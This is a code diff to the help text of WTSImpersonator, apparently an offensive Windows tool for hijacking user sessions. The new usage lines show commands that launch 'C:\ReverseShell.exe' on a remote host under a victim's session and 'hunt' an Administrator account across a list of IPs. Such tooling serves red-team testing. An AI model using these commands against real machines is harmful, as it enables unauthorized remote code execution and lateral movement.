@@ -302,11 +302,24 @@ int main(int argc, char* argv[])
         if (!strncmp(argv[i], "-h", 3) || !strncmp(argv[i], "--help", 7))
         {
 
-            printf("\n[+] Example Usage:\n\tWTSImpersonator.exe -m enum -s 192.168.40.129");
             
+            printf("\nLocal: ");
+            printf("\n\tWTSImpersonator.exe -m enum");
+            printf("\n\tWTSImpersonator.exe -m exec -id 3 -c C:\\Windows\\System32\\cmd.exe");
+            printf("\n\nRemote: ");
+            printf("\n\tWTSImpersonator.exe -m enum -s 192.168.40.129");
             printf("\n\tWTSImpersonator.exe -m exec-remote -s 192.168.40.129 -id 3 -c C:\\ReverseShell.exe -sp C:\\WTSService.exe");
-            printf("\n\tWTSImpersonator.exe -m exec -s 192.168.40.129 -id 3 -c C:\\ReverseShell.exe");
+            printf("\n\tWTSImpersonator.exe -m user-hunter -c C:\\ReverseShell.exe -sp C:\\WTSService.exe -uh LABS/Administrator -ipl C:\\IpList.txt");
+    
             printf("\n\n[+] Note: the local \"exec\" mode will only work if gets done through PsExec or a service.");
+            printf("\n\nFlags: ");
+            printf("\n\t-m / --mode - mode of execution exec/exec-remote/user-hunter.");
+            printf("\n\t-s / --server - remote server to attack.");
+            printf("\n\t-sp / --srcpath - path to the WTService.exe service executable.");
+            printf("\n\t-id / --sessionid - SessionId of that victim user obtained from the `enum` module.");
+            printf("\n\t-uh / --user-hunter - Username of the user targrted by the `user-hunter` module.");
+            printf("\n\t-ipl / --ip-list - list of IPs/hostnames used for the `user-hunter` module.");
+            printf("\n\t-c / --command - binary path you want to run, it is better to use the full path with this flag.");
 
         }
 
@@ -529,31 +542,5 @@ int main(int argc, char* argv[])
 
 }
 
-
-//std::string GetLastErrorAsString()
-//{
-//    //Get the error message ID, if any.
-//    DWORD errorMessageID = ::GetLastError();
-//    if (errorMessageID == 0) {
-//        return std::string(); //No error message has been recorded
-//    }
-//
-//    LPSTR messageBuffer = nullptr;
-//
-//    //Ask Win32 to give us the string version of that message ID.
-//    //The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
-//    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-//        NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
-//
-//    //Copy the error message into a std::string.
-//    std::string message(messageBuffer, size);
-//
-//    //Free the Win32's string's buffer.
-//    LocalFree(messageBuffer);
-//
-//    return message;
-//
-//
-//}
 
 
